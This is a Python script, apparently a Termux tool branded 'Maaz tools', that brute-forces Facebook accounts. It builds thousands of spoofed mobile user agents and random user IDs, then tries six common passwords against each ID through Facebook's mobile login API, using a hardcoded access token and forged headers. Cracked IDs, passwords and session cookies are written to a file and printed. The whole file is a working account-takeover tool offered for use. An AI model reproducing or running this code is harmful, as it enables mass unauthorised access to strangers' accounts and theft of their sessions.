import os
import datetime
import random
import requests
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import uuid
import base64
import hashlib
import zlib
import subprocess
import time
import platform
import _socket
import ssl
import certifi
import bs4
import json
import sys
import re
import struct
import string

# System setup
os.system('pkg install espeak')

# Global variables initialization
loop, count, oks, cps, twf, usragent, ugen, okhbros, uas = 0, 0, [], [], [], [], [], [], []

# Color codes
y = "\x1b[38;5;208m"
g = "\x1b[38;5;46m"
s = "\33[38;5;37m"
r = "\33[38;5;160m"
w = "\033[1;97m"

# Samsung Galaxy Tab models
gt = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550', 'GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388'])

# Windows User Agent Generator Function
def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    
    return random.choice([A, B, C, D])

# Simple UA function
def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

# User Agent Generation - Samsung Galaxy Tab devices
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13'])
    c = f' TL-tl; {str(gt)}'
    g_part = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}) {g_part}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# User Agent Generation - Xiaomi devices (M2101K6G series)
for agenku in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.0', '6.0', '7.0', '8.1.0', '9', '10', '11', '12'])
    c = random.choice(['M2101K6G'])
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g_part = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uakuh = f'{a} {b}; {c}{d}{e}{f}) {g_part}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# User Agent Generation - Samsung J3 series
for ua_loop in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.1.1', '6.0.1', '7.1.1', '12', '13', '14', '15'])
    y = random.choice(['SM-J320H', 'SM-J3109', 'J320FN', 'SM-J320P', 'SM-J320F', 'SM-J320G', 'SM-J320Y'])
    c = 'Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g_num = random.randrange(20, 100)
    h = 'Mobile Safari/537.36'
    aalhaj = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g_num} {h}"
    ugen.append(aalhaj)

# User Agent Generation - Samsung J3 series (variant 2)
for ua_loop in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.1.1', '6.0.1', '7.1.1', '11', '12', '13', '14', '15'])
    y = random.choice(['SM-J320H', 'SM-J3109', 'J320FN', 'SM-J320P', 'SM-J320F', 'SM-J320G', 'SM-J320Y'])
    c = 'Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g_num = random.randrange(20, 100)
    h = 'Mobile Safari/537.36'
    alhajb = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g_num} {h}"
    ugen.append(alhajb)

# User Agent Generation - Realme devices
for ua_loop in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8', '9', '10', '11', '12', '13', '14', '15'])
    y = random.choice(['RMX3571', 'RMX3511', 'RMX3461', 'RMX3741', 'RMP2107', 'RMX3572', 'RMX1921', 'RMX3121', 'RMX3121', 'RMX3350', 'RMX3511'])
    c = 'Build/TQ1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g_num = random.randrange(20, 100)
    h = 'Mobile Safari/537.36'
    alhajc = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g_num} {h}"
    ugen.append(alhajc)

# User Agent Generation - Tecno devices
for ua_loop in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15'])
    xs = 'TECNO'
    nx = random.choice(['CE8', 'KG5p', 'IN6', 'IN2', 'CE9', 'IN1', 'BD4h', 'K8', 'CE7', 'A571LS', 'BE8', 'BD4j', 'BD3', 'L6502S', 'RC6'])
    c = f'Build/TQ1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g_num = random.randrange(20, 150)
    h = 'Mobile Safari/537.36'
    alhajj = f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g_num} {h}"
    ugen.append(alhajj)

# Continue with remaining user agent generations...
print(f"Generated {len(ugen)} user agents successfully!")
print("Sample user agents:")
for i in range(5):
    print(f"{i+1}. {ugen[i]}")
   

def linex():
    print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def line():
    print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Logo
logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    \x1b[38;5;46m███╗░░░███╗░█████╗░\x1b[38;5;27m░█████╗░\x1b[38;5;220m███████╗\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m████╗░████║██╔══██╗\x1b[38;5;27m██╔══██╗\x1b[38;5;220m╚════██║\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██╔████╔██║███████║\x1b[38;5;27m███████║\x1b[38;5;220m░░███╔═╝\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██║╚██╔╝██║██╔══██║\x1b[38;5;27m██╔══██║\x1b[38;5;220m██╔══╝░░\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██║░╚═╝░██║██║░░██║\x1b[38;5;27m██║░░██║\x1b[38;5;220m███████╗\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m╚═╝░░░░░╚═╝╚═╝░░╚═╝\x1b[38;5;27m╚═╝░░╚═╝\x1b[38;5;220m╚══════╝\x1b[38;5;196m    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               
"""

def clear():
    os.system('clear')
    print(logo)



def linex():print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

os.system('clear')

# ✅ Main Function (Runs after successful login)
os.system('espeak -a 300 "well,come to,Maaz, tools"')
logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    \x1b[38;5;46m███╗░░░███╗░█████╗░\x1b[38;5;27m░█████╗░\x1b[38;5;220m███████╗\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m████╗░████║██╔══██╗\x1b[38;5;27m██╔══██╗\x1b[38;5;220m╚════██║\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██╔████╔██║███████║\x1b[38;5;27m███████║\x1b[38;5;220m░░███╔═╝\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██║╚██╔╝██║██╔══██║\x1b[38;5;27m██╔══██║\x1b[38;5;220m██╔══╝░░\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m██║░╚═╝░██║██║░░██║\x1b[38;5;27m██║░░██║\x1b[38;5;220m███████╗\x1b[38;5;196m    ║
\x1b[38;5;46m║    \x1b[38;5;46m╚═╝░░░░░╚═╝╚═╝░░╚═╝\x1b[38;5;27m╚═╝░░╚═╝\x1b[38;5;220m╚══════╝\x1b[38;5;196m    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
"""
"\033[0;41m      [ WORKING WIFI AND MOBILE DATA ]       \033[0;92m"
"\033[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
"\033[38;5;160m[\033[1;97m✅\033[38;5;46m] \033[1;97mFACEBOOK   \033[38;5;46m▶  \033[1;97mMohmmad MAAZ "
"\033[38;5;160m[\033[1;97m✅\033[38;5;46m] \033[1;97mWHATAPP    \033[38;5;46m▶  \033[1;97m03079741690"
"\033[38;5;160m[\033[1;97m✅\033[38;5;46m] \033[1;97mFEATURE    \033[38;5;46m▶  \033[1;97mOLD CLONE "
"\033[38;5;160m[\033[1;97m✅\033[38;5;46m] \033[1;97mVERSION    \033[38;5;46m▶  \033[1;97m2.2"
"\033[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def clear():
	os.system('clear');print(logo)

def main():
    clear()
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"
    ]

    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(f"\r{r}[{w}ᯤ{r}]{s} LOADING...\033[97;1m " + animation[i % len(animation)] + "\x1b[0m ")
        sys.stdout.flush()

    clear()
    print(f'\33[38;5;46m[\033[1;97m1\33[38;5;46m] \033[1;97mRandom Method \33[38;5;46m[\33[38;5;37m2009/2012\33[38;5;46m]\033[1;97m')
    linex()
    
    ch = input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')

    if ch in ('1','01','11','A','১','০১','a','A'):
        __Random_Method__()
    
      
def __Random_Method__():
    user = []
    clear()
    limit = input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97m1.10000 | 2.30000 | 3.50000 | 4.99999\n\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION ▶ ')
    limit = {'1':10000,'2':30000,'3':50000,'4':99999}.get(limit,10000)
    linex()

    # Simple Mix UID Logic
    mix_series = ["100000", "100001", "100002", "100003", "100005"]
    
    for i in range(int(limit)):
        # Random series selection from mix
        selected_series = random.choice(mix_series)
        data = str(random.choice(range(100000000, 199999999)))
        uid = selected_series + data
        user.append(uid)

    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mTOTAL ID \33[38;5;46m▶ \033[1;97m{limit}')
        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mMIX SERIES \33[38;5;46m▶ \033[1;97mALL SERIES')
        linex()
        for uid in user:
            jihad.submit(login1, uid)

    line()
    print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!')
    linex()
    print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
    linex()
    input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mENTER TO BACK & RUN AGAIN...\33[38;5;46m!\033[1;37m')
    main()



def login1(uid):
    global oks, loop, cps
    Session = requests.session()
    try:
        sys.stdout.write(
            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
        )
        sys.stdout.flush()
        ua = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","1234567890","123123"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:
                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                oks.append(uid)
                open("/sdcard/MAAZ_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                break

            elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                cps.append(uid)
                open("/sdcard/MAAZ_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                break

            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(5)

if __name__ == "__main__":
    main()
